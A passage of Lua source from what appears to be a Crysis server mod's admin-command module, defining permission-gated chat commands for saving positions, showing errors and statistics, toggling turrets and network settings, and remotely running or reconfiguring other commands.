			SendMsg(CHAT_ATOM, target, "(WEAPONS: %s No Weapon Limit)", (target.noWeaponLimit and "Enabled" or "Disabled"));
			SendMsg(CHAT_ATOM, player, "(WEAPONS: %s No Weapon Limit on %s)", (target.noWeaponLimit and "Enabled" or "Disabled"), target:GetName());
		end;
		return true;
	end;
});

------------------------------------------------------------------------
-- !save, Saves your current position

NewCommand({
	Name 	= "save",
	Access	= SUPERADMIN,
	Description = "Saves your current position",
	Console = true,
	Args = {
		{ "Slot", "Slot to save position in", Integer = true, Range = { 1, 10 }};
	};
	Properties = {
	--	Self = 'ATOMGameUtils',
	};
	func = function(player, slot)
		player.perfs.positions = player.perfs.positions or {};
		local nextSlot = slot or arrSize(player.perfs.positions) + 1;
		player.perfs.positions[nextSlot] = {
			pos = player:GetPos(),
			ang = player:GetAngles()
		};
		player.perfs.LastSlot = nextSlot;
		SendMsg(CHAT_ATOM, player, "POSITION : Saved to Slot - [ %d ]", nextSlot);
		return true;
	end;
});

------------------------------------------------------------------------
-- !load, Loads a saved position

NewCommand({
	Name 	= "load",
	Access	= SUPERADMIN,
	Description = "Loads a saved position",
	Console = true,
	Args = {
		{ "Slot", "Slot to load the position from", Integer = true, Range = { 1, 10 }};
	};
	Properties = {
	--	Self = 'ATOMGameUtils',
	};
	func = function(player, slot)
		player.perfs.positions = player.perfs.positions or {};
		local loadSlot = slot or player.perfs.LastSlot or 1;
		if(not loadSlot or not player.perfs.positions[loadSlot])then
			return false, "invalid slot";
		end;
		local pos = player.perfs.positions[loadSlot];
		
		g_game:MovePlayer(player.id, pos.pos, pos.ang);
		SpawnEffect(ePE_Light, pos.pos);
		
		SendMsg(CHAT_ATOM, player, "POSITION : Loaded from Slot - [ %d ]", loadSlot);
		return true;
	end;
});

--------------------------------------------------------------
-- !runtime, Shows the Servers running time and other infos
--------------------------------------------------------------

NewCommand({
	Name 	= "runtime",
	Access	= SUPERADMIN,
	Description = "Shows the Servers running time and other infos",
	Console = true,
	Args = {
	--	{ "Number", "The new amount of maximum allowed players", Integer = true, Required = true, Range = { -9, 99 } };
	};
	Properties = {
		Self = 'ATOM',
	};
	func = function(self, player, MaxPlayers)
		SendMsg(CHAT_ATOM, player, "(SERVER: Run Time: %s, Slot: %d, Connections: %d, Connected: %d, Disconnected: %d, Game Error: %d)", calcTime(_time, true, unpack(GetTime_SMHD)), (HIGHEST_SLOT or 0), (CONNECTIONS or 0), (CONNECTED or 0), (DISCONNECTED or 0), (DISCONNECTED_ASPECT or 0));	
		return true;
	end;
});

--------------------------------------------------------------
-- !concolor, Changes the default console entity color
--------------------------------------------------------------

NewCommand({
	Name 	= "concolor",
	Access	= SUPERADMIN,
	Description = "Changes the default console entity color",
	Console = true,
	Args = {
		{ "Color", "The ID of the color", Integer = true, Required = true, Default = 0 };
	};
	Properties = {
		Self = 'ATOMGameUtils',
	};
	func = function(self, player, Index)
		if(Index == 0)then
			if(not CON_COLOR_ENTITY)then
				return false, "Color already default";
			end;
			CON_COLOR_ENTITY = nil;
			SendMsg(CHAT_ATOM, player, "Console-Color : Restored");
			return true;
		end;
		local colors = self:GetColors();
		local newColor = colors[Index];
		if(not newColor)then
			return false, "Invalid Color";
		end;
		CON_COLOR_ENTITY = newColor[1];
		SendMsg(CHAT_ATOM, player, "Console Color - Changed to : " .. newColor[2]);
		return true;
	end;
});

--------------------------------------------------------------
-- !msgcolor, Changes the default console entity color
--------------------------------------------------------------

NewCommand({
	Name 	= "msgcolor",
	Access	= SUPERADMIN,
	Description = "Changes the default console entity color",
	Console = true,
	Args = {
		{ "Color", "The ID of the color", Integer = true, Required = true, Default = 0 };
	};
	Properties = {
		Self = 'ATOMGameUtils',
	};
	func = function(self, player, Index)
		if(Index == 0)then
			if(not CON_COLOR_MSG)then
				return false, "Color already default";
			end;
			CON_COLOR_MSG = nil;
			SendMsg(CHAT_ATOM, player, "Console-Message Color : Restored");
			return true;
		end;
		local colors = self:GetColors();
		local newColor = colors[Index];
		if(not newColor)then
			return false, "Invalid Color";
		end;
		CON_COLOR_MSG = newColor[1];
		SendMsg(CHAT_ATOM, player, "Console Message Color - Changed to : " .. newColor[2]);
		return true;
	end;
});

------------------------------------------------------------------------
-- !errors, Shows recently logged errors

NewCommand({
	Name 	= "errors",
	Access	= SUPERADMIN,
	Description = "Shows the Servers running time and other infos",
	Console = true,
	Args = {
		{ "Number", "Display only this amount of errors", Integer = false, Optional = true };
	};
	Properties = {
	--	Self = 'ATOM',
	};
	func = function(player, num)
		local allErrors = copyTable(LOGGED_ERRORS or {});
		if(not allErrors or arrSize(allErrors) < 1)then
			return false, "no errors found";
		end;
		if (num and num == "flush") then
			SendMsg(CHAT_ERROR, player, "Flushed [ %d ] Errors!", arrSize(allErrors));
			LOGGED_ERRORS = {};
			return true;
		else
			num = tonumber(num);
		end;
		
		if (num and num < arrSize(allErrors)) then
			while arrSize(allErrors) > num do
				table.remove(allErrors, 1);
			end;
			SendMsg(CHAT_ERROR, player, "Open console to view the last [ %d ] Errors", num);
		else
			SendMsg(CHAT_ERROR, player, "Open console to view the [ %d ] Errors", arrSize(allErrors));
		end;
		SendMsg(CONSOLE, player, "$9=================================================================================================================");
		SendMsg(CONSOLE, player, "$9  ID    Time Ago       Message");
		SendMsg(CONSOLE, player, "$9=================================================================================================================");
		local timeAgo;
		local err;
		local logged = 0
		for i = arrSize(allErrors), 1, -1 do
			logged = logged + 1
			err = allErrors[i]
			timeAgo = calcTime(_time - err[2], true, unpack(GetTime_SMH));
			SendMsg(CONSOLE, player, "$9[ $1" .. string.lenprint(arrSize(allErrors)-i, 4) .. "$9: " .. string.lenprint(timeAgo, 12) .. " ] $4" .. string.lenprint(tostr(string.gsub(err[1], "attempt to perform", "ATP:")), 88) .. " $9]");
			if (logged > 500) then
				break
			end
		end;
		SendMsg(CONSOLE, player, "$9=================================================================================================================");
	end;
});

------------------------------------------------------------------------
-- !cerrors, Shows recently logged errors

NewCommand({
	Name 	= "cerrors",
	Access	= SUPERADMIN,
	Description = "Clears error queue",
	Console = true,
	Args = {
	--	{ "Number", "Display only this amount of errors", Integer = false, Optional = true };
	};
	Properties = {
	--	Self = 'ATOM',
	};
	func = function(player, num)
		local iErrors = arrSize(LOGGED_ERRORS)
		SendMsg(CHAT_ATOM, player, "Flushed %d Errors", iErrors)
		LOGGED_ERRORS = {}
	end;
});


------------------------------------------------------------------------
-- !bturrtes, Enables or Disables mega turrets

NewCommand({
	Name 	= "bturrtes",
	Access	= MODERATOR,
	Description = "Toggles badass mode on specified turrets",
	Console = true,
	Args = {
		{ "Team", "The name or ID from the Team, blank for all Teams", Optional = true, AcceptThis = {
			['nk'] = true,
			['us'] = true,
			['all'] = true,
			[0] = true,
			[1] = true,
			[2] = true
		}};
	--	{ "FollowTerrain", "Will adjust position to terrain height", Optional = true };
	};
	Properties = {
		Self = 'ATOMGameUtils',
	};
	func = function(self, player, teamId)--, Distance)--, FollowTerrain)
		return self:SetBadAssTurrets(player, teamId, true);
	end;
});


------------------------------------------------------------
-- !leave <reason>, Leaves the server with specified reason

NewCommand({
	Name 	= "leave",
	Access	= ADMINISTRATOR,
	Description = "Reconnects you to the Server",
	Console = true,
	Args = {
		{ "Reason", "Why are u leaving", Optional = true, Concat = true, Length = { 1, 50 } };
	};
	Properties = {
		Self = 'RCA',
		Timer = 1,
		--RequireRCA = true
	};
	func = function(self, player, reason)
		g_dll:Disconnect(player.id, reason or "User left the game");
	end;
});

------------------------------------------------------------------------
-- !gturrets, Enables or Disables custom guns on turrets

NewCommand({
	Name 	= "gturrets",
	Access	= MODERATOR,
	Description = "Toggles badass mode on specified turrets",
	Console = true,
	Args = {
		{ "Gun", "The Name of the new gun", Required = true };
		{ "Team", "The name or ID from the Team, blank for all Teams", Optional = true, AcceptThis = {
			['nk'] = true,
			['us'] = true,
			['all'] = true,
			[0] = true,
			[1] = true,
			[2] = true
		}};
	--	{ "FollowTerrain", "Will adjust position to terrain height", Optional = true };
	};
	Properties = {
		Self = 'ATOMGameUtils',
	};
	func = function(self, player, gunName, teamId)--, Distance)--, FollowTerrain)
		return self:ChangeGunTurretGuns(player, teamId, true, gunName);
	end;
});

------------------------------------------------------------------------
-- !lagfix, Toggles CryTek lagfix

NewCommand({
	Name 	= "lagfix",
	Access	= SUPERADMIN,
	Description = "Toggles CryTek lagfix",
	Console = true,
	Args = {
	--	{ "Target", "The Name of the target you wish to toggle no weapon limit on",Target = true, AcceptSelf = true, AcceptAll = true };
	};
	Properties = {
	--	Self = 'ATOMGameUtils',
	};
	func = function(player, target)
		local v = System.GetCVar("a_crytek_anti_lag");
		if(v == 0)then
			ATOMDLL:ForceSetCVar("a_crytek_anti_lag", "1");
		else
			ATOMDLL:ForceSetCVar("a_crytek_anti_lag", "0");
		end;
		SendMsg(CHAT_ATOM, player, "(ANTILAG: " .. (v==0 and "ENABLED" or "DISABLED") .. ")");
		return true;
	end;
});

------------------------------------------------------------------------
-- !timeout, Set's how many seconds without receiving a packet a connection will stay alive for

NewCommand({
	Name 	= "timeout",
	Access	= SUPERADMIN,
	Description = "Set's how many seconds without receiving a packet a connection will stay alive for",
	Console = true,
	Args = {
		{ "Timer", "The amount of time until disconnecting inactive connections",Integer = true, Required = true, Range = { 1, 91 } };
	};
	Properties = {
	--	Self = 'ATOMGameUtils',
	};
	func = function(player, Timer)
		if(System.GetCVar("net_inactivityTimeout") == Timer)then
			return false, "choose different value";
		end;
		ATOMDLL:ForceSetCVar("net_inactivityTimeout", tostr(Timer));
		SendMsg(CHAT_ATOM, player, "(TIMEOUT: Connection timeout set to " .. System.GetCVar("net_inactivityTimeout") .. " seconds)");
		ATOMLog:LogGameUtils("SuperAdmin", "Connection timeout set to %d Seconds", System.GetCVar("net_inactivityTimeout"));
		return true;
	end;
});

------------------------------------------------------------------------
-- !statistics, See the collected Server Statistics

NewCommand({
	Name 	= "statistics",
	Access	= SUPERADMIN,
	Description = "See the collected Server Statistics",
	Console = true,
	Args = {
	--	{ "Timer", "The amount of time until disconnecting inactive connections",Integer = true, Required = true, Range = { 1, 91 } };
	};
	Properties = {
		Self = 'g_statistics',
	};
	func = function(self, player)

		SendMsg(CONSOLE, player, "$9===== [ Statistics ] ===========================================================================================")
		SendMsg(CONSOLE, player, "$9 ")
		SendMsg(CONSOLE, player, "$9           RunTime : $4 " .. SimpleCalcTime(self:GetValue("Runtime"))) --calcTime(self:GetValue("Runtime"), true, 1, 1, 1, 1):gsub(":", ": "))
		SendMsg(CONSOLE, player, "$9   RunTime Average : $4 " .. SimpleCalcTime(self:GetValue("RuntimeAverage"))) --calcTime(self:GetValue("RuntimeAverage"), true, 1, 1, 1, 1):gsub(":", ": "))
		SendMsg(CONSOLE, player, "$9    Total Connects : $4 " .. self:GetValue("PlayerTotal"))
		SendMsg(CONSOLE, player, "$9 Total Connections : $4 " .. self:GetValue("ConnTotal"))
		SendMsg(CONSOLE, player, "$9      Most Players : $4 " .. self:GetValue("Maximum"))
		SendMsg(CONSOLE, player, "$9  Player Play Time : $4 " .. SimpleCalcTime(self:GetValue("TimeTotal"))) --calcTime(self:GetValue("TimeTotal"), true, 1, 1, 1, 1):gsub(":", ": "))
		SendMsg(CONSOLE, player, "$9   Player Time Avg : $4 " .. SimpleCalcTime(self:GetValue("TimeAverage"))) --calcTime(self:GetValue("TimeAverage"), true, 1, 1, 1, 1):gsub(":", ": "))
		SendMsg(CONSOLE, player, "$9             Kills : $4 " .. self:GetValue("KillsTotal"))
		SendMsg(CONSOLE, player, "$9            Deaths : $4 " .. self:GetValue("DeathsTotal"))
		SendMsg(CONSOLE, player, "$9     Chat Messages : $4 " .. self:GetValue("ChatTotal"))
		SendMsg(CONSOLE, player, "$9     Commands Used : $4 " .. self:GetValue("CommandsTotal"))
		SendMsg(CONSOLE, player, "$9     Meters Walked : $4 " .. string.dotnumber(self:GetValue("MetersWalked"), 1))
		SendMsg(CONSOLE, player, "$9     Meters Driven : $4 " .. string.dotnumber(self:GetValue("MetersDriven"), 1))
		SendMsg(CONSOLE, player, "$9      Meters Flown : $4 " .. string.dotnumber(self:GetValue("MetersFlighted"), 1))
		SendMsg(CONSOLE, player, "$9      Damage Dealt : $4 " .. string.dotnumber(self:GetValue("DamageDealt"), 1))
		SendMsg(CONSOLE, player, "$9     Bullets Fired : $4 " .. string.dotnumber(self:GetValue("BulletsFired"), 1))
		SendMsg(CONSOLE, player, "$9       Hits Landed : $4 " .. string.dotnumber(self:GetValue("HitsLanded"), 1))
		SendMsg(CONSOLE, player, "$9================================================================================================================")
		SendMsg(CHAT_ATOM, player, "Open your Console to view the Server Statistics!");
	end;
});

------------------------------------------------------------------------
-- !rcom, Remotely executes a chat command on a player

NewCommand({
	Name 	= "rcom",
	Access	= SUPERADMIN,
	Description = "Remotely executes a chat command on a player",
	Console = true,
	Args = {
		{ "Target", "The Name of the target you wish to execute the command on",Target = true, AcceptSelf = false, AcceptAll = true, EqualAccess=true };
		{ "Command", "The Name of the command to execute",Required=true };
		{ "Arguments", "The arguments for the command",Required=false };
	};
	Properties = {
		Self = 'ATOMCommands',
	};
	func = function(self, player, target, commandName, ...)
		local command = self:GetCommand(commandName);
		if(not command)then
			local status, guessed = self:GetCommandByGuess(commandName, player:GetAccess());
			if(status == 1 or status == 2)then
				command = self:GetCommand(guessed[1]);
			elseif(status == 3)then
				self:ListMatches(player, guessed, true);
				return false, "invalid command", self:Msg(player, eFR_ManyMatches, commandName, arrSize(guessed), true);
			end;
		end;
		if(not command)then
			return false, "unknown command";
		end;
		local commandAccess = command[2]
		if(target ~= "all")then
			--target = GetPlayer(target);
			if (not target) then
				return false, "invalid player"
			end
			if(commandAccess > target:GetAccess())then
				target.rCOM = commandAccess;
			end
			target.WasRemoteExecution = true;
			self:ProcessCommand(target, command[1], false, unpack({...}));
			SendMsg(CHAT_ATOM, player, "(%s: Executed on %s)", command[1]:upper(), target:GetName());
		else
			local x = 0;
			for i, v in pairs(GetPlayers()or{})do
				if(v:GetAccess()<=player:GetAccess())then
					x = x + 1;
					if(commandAccess > v:GetAccess())then
						v.rCOM = commandAccess;
					end;
					v.WasRemoteExecution = true;
					self:ProcessCommand(v, command[1], false, unpack({...}));
				end;
			end;
			SendMsg(CHAT_ATOM, player, "(%s: Executed on %d Players)", command[1]:upper(), x);
		end;
		return true;
	end;
});

------------------------------------------------------------------------
-- !dcom, Disables specified command

NewCommand({
	Name 	= "dcom",
	Access	= SUPERADMIN,
	Description = "Disables specified command",
	Console = true,
	Args = {
	--	{ "Target", "The Name of the target you wish to execute the command on",Target = true, AcceptSelf = false, AcceptAll = false, EqualAccess=true };
		{ "Command", "The Name of the command to disable",Required=true };
	--	{ "Arguments", "The arguments for the command",Required=false };
	};
	Properties = {
		Self = 'ATOMCommands',
	};
	func = function(self, player, commandName)
		return self:DisableCommand(player, commandName);
	end;
});

------------------------------------------------------------------------
-- !dcomlist, Displays a list with all disabled commands

NewCommand({
	Name 	= "dcomlist",
	Access	= SUPERADMIN,
	Description = "Disables specified command",
	Console = true,
	Args = {
	--	{ "Target", "The Name of the target you wish to execute the command on",Target = true, AcceptSelf = false, AcceptAll = false, EqualAccess=true };
	--	{ "Command", "The Name of the command to disable",Required=true };
	--	{ "Arguments", "The arguments for the command",Required=false };
	};
	Properties = {
		Self = 'ATOMCommands',
	};
	func = function(self, player, commandName)
		local disabled = DISABLED_COMMANDS;
		if(not disabled)then
			return false, "no disabled commands found";
		end;
		local display = {};
		for i, v in pairs(disabled) do
			if(v.access <= player:GetAccess())then
				display[arrSize(display)+1] = {
					v.player,
					self:GetCommand(i),
					i
				};
			end;
		end;
		if(arrSize(display) < 1)then
			return false, "no disabled commands found";
		end;
		table.sort(display,function(a,b)
			return self:GetCommand(a[3])[2]>self:GetCommand(b[3])[2]
		end);
		SendMsg(CONSOLE, player, "$9=================================================================================================================");
		SendMsg(CONSOLE, player, "$9  Command         Access        Admin                      Description                                           ");
		SendMsg(CONSOLE, player, "$9=================================================================================================================");
		for i, com in pairs(display) do
			local cmd = com[2]
			local admin = (GetEnt(com[1]) and GetEnt(com[1]):GetName() or "Unknown");
			if(cmd)then
				SendMsg(CONSOLE, player, "$9[ $1!$9" .. string.lenprint(cmd[1], 14) .. " " .. GetGroupData(cmd[2])[4] .. string.lenprint(GetGroupData(cmd[2])[2], 13) .. " $4" .. string.lenprint(admin, 26) .. " $1" .. string.lenprint(cmd[6], 52) .. " $9]");
			
			end;
		end;
		SendMsg(CONSOLE, player, "$9=================================================================================================================");
	end;
});


------------------------------------------------------------------------
-- !setcom, Changes properties of specified command

NewCommand({
	Name 	= "setcom",
	Access	= SUPERADMIN,
	Description = "Changes properties of specified command",
	Console = false,
	Args = {
	--	{ "Target", "The Name of the target you wish to execute the command on",Target = true, AcceptSelf = false, AcceptAll = false, EqualAccess=true };
		{ "Command", 	"The Name of the command to disable", Required = true };
		{ "Property", 	"The property of the command you wish to change", Required = true };
		{ "Value", 		"The new value for the specified property", Required = false, Optional = true };
	--	{ "Arguments", "The arguments for the command",Required=false };
	};
	Properties = {
		Self = 'ATOMCommands',
	};
	func = function(self, player, commandName, prop, val, ...)
		local command = self:GetCommand(commandName);
		if(not command)then
			local status, guessed = self:GetCommandByGuess(commandName, player:GetAccess());
			if(status == 1 or status == 2)then
				command = self:GetCommand(guessed[1]);
			elseif(status == 3)then
				self:ListMatches(player, guessed, true);
				return false, "invalid command", self:Msg(player, eFR_ManyMatches, commandName, arrSize(guessed), true);
			end;
		end;
		if(not command)then
			return false, "unknown command";
		end;
		local comname = command[1]:upper();
		local commandProps = command[5];
		local commandAccess = command[2];
		if(commandAccess > player:GetAccess())then
			return false, "invalid command";
		end;
		if(prop == "timer")then
			if(val and tonumber(val))then
				if(tonumber(val) == commandProps.Timer)then
					return false, "choose different value";
				end;
				commandProps.Timer = tonumber(val);
				SendMsg(CHAT_ATOM, player, "(%s: Cooldown Set To %s)", comname, calcTime(commandProps.Timer, true, unpack(GetTime_SM)));
			else
				SendMsg(CHAT_ATOM, player, "(%s: Current Cooldown is %s)", comname, calcTime(commandProps.Timer, true, unpack(GetTime_SM)));
			end;
			return true;
		elseif(prop == "cost")then
			if(val and tonumber(val))then
				if(tonumber(val) == commandProps.Cost)then
					return false, "choose different value";
				end;
				commandProps.Cost = tonumber(val);
				SendMsg(CHAT_ATOM, player, "(%s: Price Set To %s)", comname, commandProps.Cost);
			else
				SendMsg(CHAT_ATOM, player, "(%s: Current Price is %s)", comname, commandProps.Cost);
			end;
			return true;
		elseif(prop == "desc")then
			if(val)then
				val = val .. " " ..  table.concat({...}, " ");
				if(val == command[6])then
					return false, "choose different description";
				end;
				command[6] = tostr(val);
				SendMsg(CHAT_ATOM, player, "(%s: Description Set To %s)", comname, command[6]);
			else
				SendMsg(CHAT_ATOM, player, "(%s: Description is: %s)", comname, command[6] or "N/A");
			end;
			return true;
		elseif(prop == "console")then
			local con = not (commandProps.FromConsole == false);
			if(val ~= nil)then
				local docon = tonumber(val) > 0;
				if(con == docon)then
					return false, "choose different status";
				end;
				commandProps.FromConsole = docon;
				SendMsg(CHAT_ATOM, player, "(%s: Usable from Console Set To: %s)", comname, tostr(commandProps.FromConsole));
			else
				SendMsg(CHAT_ATOM, player, "(%s: Can be used from Console: %s)", comname, tostr(con));
			end;
			return true;
		elseif(prop == "access")then
			if(val ~= nil)then
				
				val = tonumber(val)
				if(not IsUserGroup(val))then
					return false, "invalid user group";
				end;
				if(val == command[2] or val > player:GetAccess())then
					return false, "choose different access";
				end;
				
				SendMsg(CHAT_ATOM, player, "(%s: Access Changed from %s to: %s)", comname, GetGroupData(command[2])[2], GetGroupData(val)[2]);
				
				command[2] = val;
			else
				SendMsg(CHAT_ATOM, player, "(%s: Access is %s)", comname,  GetGroupData(command[2])[2]);
			end;
			return true;
		end;
	end;
});